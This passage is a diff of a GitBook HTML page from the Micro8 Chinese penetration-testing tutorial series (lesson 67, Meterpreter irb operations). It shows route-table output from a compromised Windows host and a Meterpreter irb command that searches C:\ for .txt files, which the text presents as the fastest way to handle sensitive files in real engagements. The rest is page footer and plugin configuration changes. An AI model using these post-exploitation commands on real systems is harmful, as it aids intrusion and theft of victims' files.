+dapi::Net::Route:0x000055aee789a7b0 @subnet<span class="token operator">=</span><span class="token string">&quot;127.0.0.0&quot;</span>, @netmask<span class="token operator">=</span><span class="token string">&quot;255.0.0.0&quot;</span>, @gateway<span class="token operator">=</span><span class="token string">&quot;127.0.0.1&quot;</span>, @interface<span class="token operator">=</span><span class="token string">&quot;1&quot;</span>, @metric<span class="token operator">=</span>1<span class="token operator">&gt;</span>, <span class="token comment">#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee78993b0 \@subnet=&quot;192.168.1.0&quot;, @netmask=&quot;255.255.255.0&quot;, @gateway=&quot;192.168.1.119&quot;, @interface=&quot;65539&quot;, @metric=10&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee786fec0 @subnet=&quot;192.168.1.119&quot;, @netmask=&quot;255.255.255.255&quot;, @gateway=&quot;127.0.0.1&quot;, @interface=&quot;1&quot;, @metric=10&gt;,#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee786e9d0 @subnet=&quot;192.168.1.255&quot;, @netmask=&quot;255.255.255.255&quot;, @gateway=&quot;192.168.1.119&quot;, @inte</span>
+rface<span class="token operator">=</span><span class="token string">&quot;65539&quot;</span>, @metric<span class="token operator">=</span>10<span class="token operator">&gt;</span>, <span class="token comment">#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee786d698 @subnet=&quot;224.0.0.0&quot;, @netmask=&quot;240.0.0.0&quot;, @gateway=&quot;192.168.1.119&quot;, @interface=&quot;65539&quot;, @metric=10&gt;,#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee785be98 @subnet=&quot;255.255.255.255&quot;, @netmask=&quot;255.255.255.255&quot;, @gateway=&quot;192.168.1.119&quot;,</span>
+@interface<span class="token operator">=</span><span class="token string">&quot;65539&quot;</span>, @metric<span class="token operator">=</span>1<span class="token operator">&gt;</span><span class="token punctuation">]</span>
 </code></pre>
 <p><img src="media/117133f26378e67253fb7e0e6fbb8dc3.jpg" alt=""></p>
 <p><strong>&#x5B9E;&#x6218;&#x4E2D;&#x7684;&#x654F;&#x611F;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#xFF0C;&#x4E5F;&#x662F;&#x76EE;&#x524D;&#x6700;&#x7A33;&#x5B9A;&#xFF0C;&#x901F;&#x5EA6;&#x6700;&#x5FEB;&#x7684;&#x65B9;&#x5F0F;&#xFF1A;</strong></p>
-<pre><code class="lang-bash">&gt;&gt; client.fs.file.search(<span class="hljs-string">&quot;C:\\&quot;</span>, <span class="hljs-string">&quot;*.txt&quot;</span>)
+<pre class="language-"><code class="lang-bash"><span class="token operator">&gt;&gt;</span> client.fs.file.search<span class="token punctuation">(</span><span class="token string">&quot;C:\\&quot;</span>, <span class="token string">&quot;*.txt&quot;</span><span class="token punctuation">)</span>
 </code></pre>
 <p>&#x66F4;&#x591A;&#x7684;&#x654F;&#x611F;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#xFF0C;&#x540E;&#x7EED;&#x8865;&#x5145;&#x3002;  </p>
 <p><img src="media/f9b76bce304c8f9f4f75d6db4deaccd4.jpg" alt=""></p>
@@ -1914,7 +1956,9 @@ rface=<span class="hljs-string">&quot;65539&quot;</span>, @metric=10&gt;, <span 
 <blockquote>
 <p>  Micropoor</p>
 </blockquote>
-
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; Micro8 2018 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2019-02-23 19:42
+</span></footer>
                                 
                                 </section>
                             
@@ -1957,7 +2001,7 @@ rface=<span class="hljs-string">&quot;65539&quot;</span>, @metric=10&gt;, <span 
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第六十七课：meterpreter下的irb操作第一季","level":"1.4.67","depth":2,"next":{"title":"第六十八课：基于Ruby内存加载shellcode第一季","level":"1.4.68","depth":2,"path":"Chapter1/61-70/68_基于Ruby内存加载shellcode第一季.md","ref":"Chapter1/61-70/68_基于Ruby内存加载shellcode第一季.md","articles":[]},"previous":{"title":"第六十六课：借助aspx对payload进行分离免杀","level":"1.4.66","depth":2,"path":"Chapter1/61-70/66_借助aspx对payload进行分离免杀.md","ref":"Chapter1/61-70/66_借助aspx对payload进行分离免杀.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Chapter1/61-70/67_meterpreter下的irb操作第一季.md","mtime":"2019-02-23T11:42:02.210Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T04:00:06.266Z"},"basePath":"../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第六十七课：meterpreter下的irb操作第一季","level":"1.4.67","depth":2,"next":{"title":"第六十八课：基于Ruby内存加载shellcode第一季","level":"1.4.68","depth":2,"path":"Chapter1/61-70/68_基于Ruby内存加载shellcode第一季.md","ref":"Chapter1/61-70/68_基于Ruby内存加载shellcode第一季.md","articles":[]},"previous":{"title":"第六十六课：借助aspx对payload进行分离免杀","level":"1.4.66","depth":2,"path":"Chapter1/61-70/66_借助aspx对payload进行分离免杀.md","ref":"Chapter1/61-70/66_借助aspx对payload进行分离免杀.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","theme-comscore","splitter","-sharing","sharing-plus","-expandable-chapters-small","simple-page-toc","github","github-buttons","tbfed-pagefooter","donate","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright © Micro8 2018","modify_label":"修订时间：","modify_format":"YYYY-MM-DD HH:mm"},"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"github":{"url":"https://github.com/micro8"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-comscore":{},"github-buttons":{"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/61-70/67_meterpreter下的irb操作第一季.md","mtime":"2019-02-23T11:42:02.210Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T13:55:17.972Z"},"basePath":"../..","book":{"language":""}});
         });
     </script>
 </div>
@@ -1967,27 +2011,43 @@ rface=<span class="hljs-string">&quot;65539&quot;</span>, @metric=10&gt;, <span 
     <script src="../../gitbook/theme.js"></script>
     
         
-        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        <script src="../../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
         
     
         
-        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
+        <script src="../../gitbook/gitbook-plugin-search-plus/search.js"></script>
         
     
         
-        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        <script src="../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
         
     
         
-        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        <script src="../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
         
     
         
-        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        <script src="../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-ga/plugin.js"></script>
         
     
         
         <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
         
     
 
